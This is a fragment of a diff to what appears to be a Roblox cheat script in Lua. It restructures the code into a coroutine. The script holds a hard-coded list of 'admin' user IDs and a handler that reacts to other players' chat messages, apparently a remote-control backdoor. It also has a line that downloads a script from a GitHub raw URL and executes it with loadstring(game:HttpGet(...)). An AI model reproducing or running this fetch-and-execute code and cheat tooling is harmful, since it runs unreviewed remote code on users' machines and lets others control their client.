@@ -1,4 +1,5 @@
-local admins = {
+local Thread1 = coroutine.create(function()
+    local admins = {
     528650746,
     3106920778,
     3366792711,
@@ -159,12 +160,11 @@ end)
 wait(1.5)
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/ESPUnnamed'),true))()
-
-wait(1.5)
+end)
+coroutine.resume(Thread1)
 
 for i,v in pairs(game:GetService('Players'):GetChildren()) do
-
-  v.Chatted:Connect(function(msg)
+v.Chatted:Connect(function(msg)
              local player = v
              local args = string.split(msg, " ")
              local this = game.Players.LocalPlayer
@@ -175,4 +175,4 @@ for i,v in pairs(game:GetService('Players'):GetChildren()) do
 				info.Position = UDim2.new(0, 260, 0, 800)
            end
       end)
-  end
+end
